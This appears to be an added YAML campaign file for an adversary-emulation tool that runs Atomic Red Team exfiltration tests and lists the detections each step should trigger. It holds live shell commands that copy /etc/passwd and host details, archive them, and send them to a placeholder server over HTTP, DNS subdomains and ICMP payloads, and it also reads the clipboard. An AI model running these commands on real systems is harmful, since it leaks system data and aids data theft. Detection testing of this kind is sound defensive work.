@@ -1,0 +1,165 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: art-exfiltration-multi
+  adversary: Atomic Red Team
+  description: "Real data exfiltration techniques — DNS, HTTP, archive staging, clipboard"
+  objective: "Execute real data staging and exfiltration to validate detection of data theft patterns"
+  mitre_version: "15.1"
+  severity: critical
+  tags: [art, atomic-red-team, exfiltration, collection, multi-platform, live-execution]
+  authors: ["ThreatEcho"]
+  references:
+    - https://github.com/redcanaryco/atomic-red-team
+    - https://attack.mitre.org/tactics/TA0010/
+    - https://attack.mitre.org/tactics/TA0009/
+  created: "2024-08-15"
+  modified: "2026-09-14"
+
+variables:
+  exfil_server: "EXFIL_SERVER"
+  staging_dir: "/tmp/threatecho_staging"
+
+stages:
+  - id: data-staged
+    name: "Data Staging"
+    description: "Collect and stage sensitive data in a temporary directory before exfiltration"
+    technique: T1074.001
+    tactic: collection
+    platform: [linux, windows]
+    execute:
+      type: shell
+      commands:
+        - 'mkdir -p /tmp/threatecho_staging'
+        - 'cp /etc/hostname /tmp/threatecho_staging/ 2>/dev/null'
+        - 'cp /etc/passwd /tmp/threatecho_staging/ 2>/dev/null'
+        - 'whoami > /tmp/threatecho_staging/whoami.txt'
+        - 'ip addr show > /tmp/threatecho_staging/network.txt 2>/dev/null || ipconfig /all > /tmp/threatecho_staging/network.txt 2>nul'
+        - 'ls -la /tmp/threatecho_staging/'
+      elevated: false
+      cleanup:
+        - 'rm -rf /tmp/threatecho_staging'
+    expect:
+      telemetry: [file_write, file_read]
+      detections: [data_staging, suspicious_file_collection, bulk_file_copy]
+    on_success: archive-compress
+    on_failure: continue
+    timeout: 15s
+
+  - id: archive-compress
+    name: "Archive & Compress for Exfiltration"
+    description: "Compress staged data into an archive — reduces transfer size and can evade content inspection"
+    technique: T1560.001
+    tactic: collection
+    platform: [linux, windows]
+    depends_on: [data-staged]
+    execute:
+      type: shell
+      commands:
+        - 'tar czf /tmp/threatecho_exfil.tar.gz -C /tmp/threatecho_staging . 2>/dev/null || echo "tar not available"'
+        - 'ls -la /tmp/threatecho_exfil.tar.gz 2>/dev/null'
+      elevated: false
+      cleanup:
+        - 'rm -f /tmp/threatecho_exfil.tar.gz'
+    expect:
+      telemetry: [process_create, file_write]
+      detections: [data_compression, archive_creation, exfiltration_prep]
+    on_success: exfil-http
+    on_failure: continue
+    timeout: 15s
+
+  - id: exfil-http
+    name: "HTTP Exfiltration"
+    description: "Exfiltrate data over HTTP POST — most common real-world exfiltration channel"
+    technique: T1048.003
+    tactic: exfiltration
+    platform: [linux, windows]
+    depends_on: [archive-compress]
+    execute:
+      type: shell
+      commands:
+        - 'curl -s -X POST -F "file=@/tmp/threatecho_exfil.tar.gz" http://{{exfil_server}}/upload 2>/dev/null; echo "HTTP exfil attempted (exit: $?)"'
+      elevated: false
+    expect:
+      telemetry: [network_connection, process_create]
+      detections: [data_exfiltration_http, suspicious_upload, outbound_file_transfer]
+    on_success: exfil-dns
+    on_failure: continue
+    timeout: 30s
+
+  - id: exfil-dns
+    name: "DNS Exfiltration"
+    description: "Exfiltrate data via DNS queries — encodes data in subdomain labels, bypasses most firewalls"
+    technique: T1048.001
+    tactic: exfiltration
+    platform: [linux]
+    depends_on: [exfil-http]
+    execute:
+      type: shell
+      commands:
+        - 'data=$(echo "threatecho_test_data" | base64 | tr -d "=" | tr "+/" "-_"); nslookup "${data}.{{exfil_server}}" 2>/dev/null; echo "DNS exfil attempted for ${data}"'
+        - 'for chunk in $(cat /etc/hostname | xxd -p | fold -w 60); do dig "${chunk}.{{exfil_server}}" A +short 2>/dev/null; done; echo "DNS chunked exfil attempted"'
+      elevated: false
+    expect:
+      telemetry: [dns_query, network_connection]
+      detections: [dns_exfiltration, suspicious_dns_query, encoded_dns_subdomain, high_entropy_subdomain]
+    on_success: exfil-icmp
+    on_failure: continue
+    timeout: 15s
+
+  - id: exfil-icmp
+    name: "ICMP Exfiltration"
+    description: "Exfiltrate data in ICMP ping payloads — bypasses firewalls that allow ping but block other protocols"
+    technique: T1048
+    tactic: exfiltration
+    platform: [linux]
+    depends_on: [exfil-dns]
+    execute:
+      type: shell
+      commands:
+        - 'ping -c 1 -p $(echo "threatecho" | xxd -p) {{exfil_server}} 2>/dev/null; echo "ICMP exfil attempted (exit: $?)"'
+      elevated: false
+    expect:
+      telemetry: [network_connection]
+      detections: [icmp_exfiltration, suspicious_ping_payload]
+    on_success: exfil-clipboard
+    on_failure: continue
+    timeout: 10s
+
+  - id: exfil-clipboard
+    name: "Clipboard Data Collection"
+    description: "Capture clipboard contents — common for credential theft from copy-paste"
+    technique: T1115
+    tactic: collection
+    platform: [linux, windows]
+    depends_on: [exfil-icmp]
+    execute:
+      type: shell
+      commands:
+        - 'xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || powershell.exe -Command "Get-Clipboard" 2>nul || echo "no clipboard tool available"'
+      elevated: false
+    expect:
+      telemetry: [process_create]
+      detections: [clipboard_access, data_collection]
+    on_success: cleanup
+    on_failure: continue
+    timeout: 10s
+
+  - id: cleanup
+    name: "Exfiltration Cleanup"
+    description: "Remove all staged and compressed data"
+    technique: T1070.004
+    tactic: defense-evasion
+    platform: [linux, windows]
+    depends_on: [exfil-clipboard]
+    execute:
+      type: shell
+      commands:
+        - 'rm -rf /tmp/threatecho_staging /tmp/threatecho_exfil.tar.gz'
+        - 'echo "Exfiltration artifacts cleaned"'
+      elevated: false
+    expect:
+      telemetry: [file_delete]
+      detections: [indicator_removal, evidence_cleanup]
+    timeout: 5s
